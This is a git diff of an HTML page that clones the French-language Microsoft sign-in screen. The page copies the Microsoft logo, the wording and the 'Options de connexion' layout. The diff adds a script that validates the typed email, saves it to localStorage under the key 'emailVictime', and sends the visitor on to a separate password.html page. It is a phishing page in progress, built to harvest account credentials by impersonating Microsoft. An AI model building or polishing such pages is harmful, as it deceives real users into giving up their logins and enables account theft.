@@ -6,24 +6,59 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="login-container">
-        <div class="login-box">
-            <img src="logo.svg" alt="Microsoft" class="main-logo">
-            
-            <h2>Se connecter</h2>
-            <input type="email" placeholder="E-mail, téléphone ou Skype">
-            
-            <p class="no-account">Pas de compte ? <a href="#">Créez-en un !</a></p>
-            <p class="access-lost"><a href="#">Plus d'accès à votre compte ?</a></p>
-            
-            <div class="button-group">
-                <div class="signin-options">
-                    <img src="options.svg" alt="Options">
-                    <span>Options de connexion</span>
-                </div>
-                <button type="button">Suivant</button>
+    <div class="login-box">
+        <img src="logo.svg" alt="Microsoft" class="main-logo">
+        
+        <h2>Se connecter</h2>
+        <p id="error-msg" class="error-text">Entrez une adresse e-mail, un numéro de téléphone ou identifiant Skype valide.</p>
+        
+        <input type="email" id="email-field" placeholder="E-mail, téléphone ou Skype" required>
+        
+        <p>Pas de compte ? <a href="#">Créez-en un !</a></p>
+        <p><a href="#">Votre compte n'est plus accessible ?</a></p>
+        
+        <div class="button-group">
+            <div class="signin-options">
+                <img src="options.svg" alt="Options">
+                <span>Options de connexion</span>
             </div>
+        <div class="action-buttons">
+                <button type="button" class="btn-secondary" onclick="location.reload()">Retour</button>
+                <button type="button" class="btn-primary" onclick="passerAuMotDePasse()">Suivant</button>
         </div>
+
     </div>
+
+    <script>
+        function passerAuMotDePasse() {
+            var emailSaisi = document.getElementById('email-field').value;
+            var errorMsg = document.getElementById('error-msg');
+            var emailInput = document.getElementById('email-field');
+            
+            // La Regex : vérifie le format texte@texte.texte
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            
+            if(emailRegex.test(emailSaisi)) {
+                // L'e-mail est valide : on cache l'erreur (au cas où) et on change de page
+                errorMsg.style.display = "none";
+                emailInput.classList.remove("error-state");
+                
+                localStorage.setItem('emailVictime', emailSaisi);
+                window.location.href = "password.html"; 
+            } else {
+                // L'e-mail est invalide : on affiche le texte et la ligne rouge
+                errorMsg.style.display = "block";
+                emailInput.classList.add("error-state");
+            }
+        }
+        // Écouteur d'événement pour la touche "Entrée"
+        document.getElementById('email-field').addEventListener('keypress', function(event) {
+            // Si la touche pressée est "Enter"
+            if (event.key === "Enter") {
+                event.preventDefault(); // Empêche le comportement par défaut (recharger la page)
+                passerAuMotDePasse();   // Lance la même fonction que le clic sur "Suivant"
+            }
+        });
+    </script>
 </body>
 </html>
